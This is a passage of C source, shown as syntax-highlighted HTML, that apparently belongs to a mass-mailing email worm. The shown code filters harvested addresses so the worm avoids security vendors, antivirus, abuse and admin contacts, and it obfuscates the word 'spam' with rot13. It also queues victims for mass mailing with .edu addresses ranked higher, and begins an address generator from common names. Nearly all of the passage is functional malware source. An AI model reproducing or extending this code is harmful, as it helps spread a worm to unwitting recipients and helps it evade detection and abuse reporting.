        </span><span class="sc6">"ibm.com"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"google"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"kernel"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"linux"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fido"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"usenet"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"iana"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ietf"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rfc-ed"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sendmail"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"arin."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ripe."</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"isi.e"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"isc.o"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"secur"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"acketst"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pgp"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"tanford.e"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"utgers.ed"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mozilla"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc1">/*  "sourceforge", "slashdot", */</span><span class="sc0">

        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"\n\nbe_loyal:"</span><span class="sc0">     </span><span class="sc1">/* for final .exe */</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">email</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">dom</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">loyal_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrstr</span><span class="sc10">(</span><span class="sc11">dom</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">loyal_list</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">nospam_domains</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrstr</span><span class="sc10">(</span><span class="sc11">dom</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nospam_domains</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">email_filtuser</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">nospam_fullnames</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc6">"root"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"info"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"samples"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"postmaster"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"webmaster"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"noone"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nobody"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nothing"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anyone"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"someone"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"your"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"you"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"me"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bugs"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rating"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"site"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"contact"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"soft"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"no"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"somebody"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"privacy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"service"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"help"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"not"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"submit"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"feste"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ca"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gold-certs"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"the.bat"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"page"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc1">/* "support" */</span><span class="sc0">

        </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">nospam_anypart</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc6">"admin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icrosoft"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"support"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ntivi"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"unix"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"bsd"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"linux"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"listserv"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"certific"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"google"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"accoun"</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc1">/* "master" */</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc0">
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">usr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">nospam_fullnames</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrcmp</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nospam_fullnames</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrncmp</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"spm"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">rot13</span><span class="sc10">(</span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fcnz"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* "spam" */</span><span class="sc0">
    </span><span class="sc2">//if (xstrncmp(usr, tmp, 4) == 0) return 1;
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrstr</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrncmp</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"www"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrncmp</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"secur"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrncmp</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"abuse"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">nospam_anypart</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrstr</span><span class="sc10">(</span><span class="sc11">usr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nospam_anypart</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">email_filter</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">out</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cut_email</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">email_check2</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* this is to avoid ".nospam", ".dontspam", etc. */</span><span class="sc0">
        </span><span class="sc1">/* andy@host.somedomain.com.nospam */</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&gt;=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email_filtdom</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email_filtuser</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">massmail_addq</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">prior</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">m1</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">email_filter</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">m1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">=</span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">m1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">m1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">HeapAlloc</span><span class="sc10">(</span><span class="sc11">GetProcessHeap</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">tick_got</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)</span><span class="sc11">prior</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">m1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">massmail_queue</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xstrstr</span><span class="sc10">(</span><span class="sc11">m1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".edu"</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc11">p1</span><span class="sc10">-&gt;</span><span class="sc11">priority</span><span class="sc10">++;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//-----------------------------------------------------------------------------
// EMAIL GENERATOR
</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">gen_names</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc6">"john"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"john"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"alex"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"michael"</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc6">"james"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"mike"</span><span class="sc10">,</span><span class="sc0">
